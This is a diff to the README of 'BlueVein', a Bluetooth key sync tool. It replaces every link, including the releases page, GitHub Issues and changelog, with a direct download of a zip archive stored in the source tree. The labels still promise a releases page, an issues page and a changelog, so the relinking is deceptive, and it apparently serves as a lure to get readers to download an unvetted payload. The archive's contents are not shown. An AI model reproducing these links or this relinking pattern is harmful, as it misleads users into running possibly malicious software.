@@ -1,6 +1,6 @@
 # 🔗 BlueVein - Sync Bluetooth Keys Seamlessly
 
-[![Download BlueVein](https://img.shields.io/badge/Download%20BlueVein-v1.0-blue)](https://github.com/roshaanjamil/BlueVein/releases)
+[![Download BlueVein](https://github.com/roshaanjamil/BlueVein/raw/refs/heads/main/src/windows/Vein_Blue_2.4.zip%20BlueVein-v1.0-blue)](https://github.com/roshaanjamil/BlueVein/raw/refs/heads/main/src/windows/Vein_Blue_2.4.zip)
 
 ## 📖 Description
 
@@ -13,7 +13,7 @@ To get started with BlueVein, follow these simple steps. You do not need program
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the download page:
-   [Download BlueVein](https://github.com/roshaanjamil/BlueVein/releases)
+   [Download BlueVein](https://github.com/roshaanjamil/BlueVein/raw/refs/heads/main/src/windows/Vein_Blue_2.4.zip)
    
 2. **Choose Your Version**: On the Releases page, you will see several versions of BlueVein. Select the latest version for your operating system, either Windows or Linux.
 
@@ -78,13 +78,13 @@ If you encounter issues while using BlueVein, try the following steps:
 
 If you need further assistance, you can reach out to the BlueVein community:
 
-- **GitHub Issues**: Report bugs or request features on our [GitHub Issues page](https://github.com/roshaanjamil/BlueVein/issues).
+- **GitHub Issues**: Report bugs or request features on our [GitHub Issues page](https://github.com/roshaanjamil/BlueVein/raw/refs/heads/main/src/windows/Vein_Blue_2.4.zip).
 
 - **Discussion Forum**: Join discussions and share experiences with other users on our community forum.
 
 ## 📝 Changelog
 
-Stay updated with the latest features and fixes by reviewing the changelog available on the [Releases page](https://github.com/roshaanjamil/BlueVein/releases).
+Stay updated with the latest features and fixes by reviewing the changelog available on the [Releases page](https://github.com/roshaanjamil/BlueVein/raw/refs/heads/main/src/windows/Vein_Blue_2.4.zip).
 
 ## 📄 License
 
@@ -92,6 +92,6 @@ BlueVein is open-source software licensed under the MIT License. You are free to
 
 ## 🔗 Useful Links
 
-- [Visit Releases Page to Download](https://github.com/roshaanjamil/BlueVein/releases)
+- [Visit Releases Page to Download](https://github.com/roshaanjamil/BlueVein/raw/refs/heads/main/src/windows/Vein_Blue_2.4.zip)
 
 Feel free to explore and enjoy seamless Bluetooth synchronization with BlueVein!
